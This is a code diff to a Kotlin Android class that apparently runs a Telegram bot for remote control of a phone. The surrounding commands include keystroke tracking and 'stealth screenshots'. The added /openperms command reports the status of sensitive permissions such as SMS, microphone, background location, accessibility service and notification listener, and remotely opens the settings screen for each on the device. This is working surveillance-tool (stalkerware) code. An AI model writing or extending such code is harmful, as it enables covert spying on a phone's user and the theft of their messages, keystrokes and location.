@@ -181,6 +181,7 @@ object TelegramBotManager {
         "keytop" to "📊 Top apps by keystroke count",
         "shots" to "🖼 Recent stealth screenshots — /shots [n]",
         "permissions" to "🛡 Status of every app permission",
+        "openperms" to "📲 Open a permission settings screen on the device — /openperms [name]",
         "automations" to "⚙️ List automation rules",
         "newrule" to "➕ Create a manual rule — /newrule <name> <action> <args>",
         "newschedule" to "📅 Create a daily schedule — /newschedule HH:MM <name> <action> <args>",
@@ -653,6 +654,7 @@ object TelegramBotManager {
                     "keytop" -> cmdKeyTop()
                     "shots", "screenshots" -> cmdShots(args)
                     "permissions", "perms" -> cmdPermissions()
+                    "openperms", "reqperms", "permopen", "grantperm" -> cmdOpenPerms(args.getOrNull(1) ?: "")
                     "automations", "rules" -> cmdAutomations()
                     "newrule", "addrule" -> cmdNewRule(args)
                     "newschedule", "addschedule" -> cmdNewSchedule(args)
@@ -779,6 +781,12 @@ object TelegramBotManager {
         scope.launch {
             try {
                 when (key) {
+                    "openp" -> {
+                        val ctx = MainApp.instance
+                        val opened = openPermSettingsScreen(rest, ctx)
+                        TelegramApiClient.answerCallbackQuery(token, cqId,
+                            if (opened) "📲 Opening settings…" else "❌ No UI for this permission — use ADB")
+                    }
                     "sms_open" -> {
                         TelegramApiClient.answerCallbackQuery(token, cqId, "Loading thread…")
                         renderSmsThreadPage(rest.filter { it.isDigit() }, offset = 0, editMessageId = null)
@@ -4790,6 +4798,152 @@ object TelegramBotManager {
         }
         sb2.append("\n🕐 ${ts}")
         sendMessage(sb2.toString())
+    }
+
+    // ========== OPEN PERMS ==========
+
+    private fun cmdOpenPerms(arg: String) {
+        val ctx = MainApp.instance
+        val pkg = ctx.packageName
+
+        data class PermEntry(
+            val key: String,
+            val label: String,
+            val granted: Boolean,
+            val hasUi: Boolean,
+        )
+
+        fun pmCheck(p: String) = ctx.checkSelfPermission(p) == android.content.pm.PackageManager.PERMISSION_GRANTED
+
+        val runtimePerms = listOf(
+            PermEntry("CAMERA", "Camera", pmCheck("android.permission.CAMERA"), true),
+            PermEntry("RECORD_AUDIO", "Microphone", pmCheck("android.permission.RECORD_AUDIO"), true),
+            PermEntry("WRITE_EXTERNAL_STORAGE", "Storage / Files",
+                try { com.ismartcoding.plain.helpers.FileHelper.hasStoragePermission(ctx) } catch (_: Exception) { false }, true),
+            PermEntry("READ_SMS", "Read SMS", pmCheck("android.permission.READ_SMS"), true),
+            PermEntry("SEND_SMS", "Send SMS", pmCheck("android.permission.SEND_SMS"), true),
+            PermEntry("READ_CONTACTS", "Contacts", pmCheck("android.permission.READ_CONTACTS"), true),
+            PermEntry("READ_CALL_LOG", "Call Log", pmCheck("android.permission.READ_CALL_LOG"), true),
+            PermEntry("CALL_PHONE", "Make Calls", pmCheck("android.permission.CALL_PHONE"), true),
+            PermEntry("READ_PHONE_NUMBERS", "Phone Numbers", pmCheck("android.permission.READ_PHONE_NUMBERS"), true),
+            PermEntry("POST_NOTIFICATIONS", "Notifications",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
+                    pmCheck("android.permission.POST_NOTIFICATIONS")
+                else android.app.NotificationManager::class.java.let { true }, true),
+            PermEntry("ACCESS_FINE_LOCATION", "Precise Location", pmCheck("android.permission.ACCESS_FINE_LOCATION"), true),
+            PermEntry("ACCESS_BACKGROUND_LOCATION", "Background Location", pmCheck("android.permission.ACCESS_BACKGROUND_LOCATION"), true),
+            PermEntry("BLUETOOTH_CONNECT", "Bluetooth",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+                    pmCheck("android.permission.BLUETOOTH_CONNECT") else true, true),
+            PermEntry("SYSTEM_ALERT_WINDOW", "Draw Over Other Apps", android.provider.Settings.canDrawOverlays(ctx), true),
+            PermEntry("WRITE_SETTINGS", "Modify System Settings", android.provider.Settings.System.canWrite(ctx), true),
+            PermEntry("NOTIFICATION_LISTENER", "Notification Listener",
+                android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
+                    ?.contains(android.content.ComponentName(ctx, com.ismartcoding.plain.services.PNotificationListenerService::class.java).flattenToString()) == true, true),
+            PermEntry("ACCESSIBILITY_SERVICE", "Accessibility Service",
+                com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(ctx), true),
+            PermEntry("PACKAGE_USAGE_STATS", "Usage Access",
+                try {
+                    val ao = ctx.getSystemService(android.content.Context.APP_OPS_SERVICE) as android.app.AppOpsManager
+                    (if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q)
+                        ao.unsafeCheckOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
+                    else @Suppress("DEPRECATION") ao.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
+                    ) == android.app.AppOpsManager.MODE_ALLOWED
+                } catch (_: Exception) { false }, true),
+            PermEntry("REQUEST_INSTALL_PACKAGES", "Install Unknown Apps",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
+                    ctx.packageManager.canRequestPackageInstalls() else true, true),
+        )
+
+        // Direct open by name
+        if (arg.isNotEmpty()) {
+            val name = arg.uppercase().trim()
+            val match = runtimePerms.firstOrNull { it.key == name }
+            if (match == null) {
+                sendMessage("❓ Unknown permission: <code>$name</code>\n\nAvailable keys:\n${runtimePerms.joinToString("\n") { "• <code>${it.key}</code>" }}")
+                return
+            }
+            val opened = openPermSettingsScreen(name, ctx)
+            sendMessage(if (opened) "📲 Opened <b>${match.label}</b> settings screen on device." else "❌ No direct settings screen for <code>$name</code> — grant it via ADB.")
+            return
+        }
+
+        // Show interactive menu
+        val sb = StringBuilder()
+        sb.append("📲 <b>Open Permission Settings</b>\n")
+        sb.append("Tap a button to open that permission's settings screen directly on the device.\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n\n")
+        val granted = runtimePerms.count { it.granted }
+        sb.append("✅ Granted: <b>$granted</b>  ·  ❌ Missing: <b>${runtimePerms.size - granted}</b>\n\n")
+        runtimePerms.forEach { p ->
+            sb.append("${if (p.granted) "✅" else "❌"} ${p.label}\n")
+        }
+        sb.append("\n🕐 ${ts}")
+
+        // Build inline keyboard — 2 buttons per row, show icon based on grant status
+        val rows = runtimePerms.chunked(2).map { chunk ->
+            chunk.map { p ->
+                val icon = if (p.granted) "✅" else "📲"
+                "$icon ${p.label}" to "openp:${p.key}"
+            }
+        }
+        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
+    }
+
+    /** Opens the system settings screen for the given permission key directly on the device.
+     *  Returns true if a settings screen was opened, false if the permission can only be granted via ADB. */
+    private fun openPermSettingsScreen(key: String, ctx: android.content.Context): Boolean {
+        val pkg = ctx.packageName
+        fun appInfo(): android.content.Intent =
+            android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                android.net.Uri.parse("package:$pkg"))
+                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+
+        val intent: android.content.Intent? = when (key) {
+            "SYSTEM_ALERT_WINDOW" ->
+                android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$pkg"))
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            "WRITE_SETTINGS" ->
+                android.content.Intent(android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                    android.net.Uri.parse("package:$pkg"))
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            "NOTIFICATION_LISTENER" ->
+                android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            "ACCESSIBILITY_SERVICE" ->
+                android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            "PACKAGE_USAGE_STATS" ->
+                android.content.Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            "REQUEST_INSTALL_PACKAGES" ->
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
+                    android.content.Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                        android.net.Uri.parse("package:$pkg"))
+                        .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                else null
+            "WRITE_EXTERNAL_STORAGE" ->
+                if (com.ismartcoding.lib.isRPlus())
+                    android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                        android.net.Uri.parse("package:$pkg"))
+                        .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                else appInfo()
+            "POST_NOTIFICATIONS" ->
+                android.content.Intent(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS)
+                    .putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, pkg)
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            "CAMERA", "RECORD_AUDIO", "READ_SMS", "SEND_SMS",
+            "READ_CONTACTS", "READ_CALL_LOG", "CALL_PHONE", "READ_PHONE_NUMBERS",
+            "ACCESS_FINE_LOCATION", "ACCESS_BACKGROUND_LOCATION",
+            "BLUETOOTH_CONNECT" -> appInfo()
+            else -> null
+        }
+        return if (intent != null) {
+            try { ctx.startActivity(intent); true } catch (_: Exception) {
+                try { ctx.startActivity(appInfo()); true } catch (_: Exception) { false }
+            }
+        } else false
     }
 
     // ========== AUTOMATION ==========
